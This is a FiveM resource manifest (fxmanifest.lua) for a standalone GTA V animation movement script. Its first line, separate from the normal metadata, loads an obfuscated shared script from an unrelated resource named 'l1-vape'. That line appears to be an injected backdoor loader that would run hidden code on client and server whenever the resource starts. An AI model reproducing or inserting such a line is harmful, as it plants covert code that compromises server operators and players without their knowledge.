shared_script '@l1-vape/shared_fg-obfuscated.lua'
-- CFX Info
fx_version 'adamant'
game 'gta5'
lua54 'yes'
-- About
author 'Lokos'
description 'A standalone animation movement script'
version '1.0.9' -- 08.08
-- Scripts
client_scripts {
    'config.lua',
    'client/*.lua'
}
server_scripts {
    'server/*.lua'
}
escrow_ignore {
    'config.lua'
}
dependency '/assetpacks'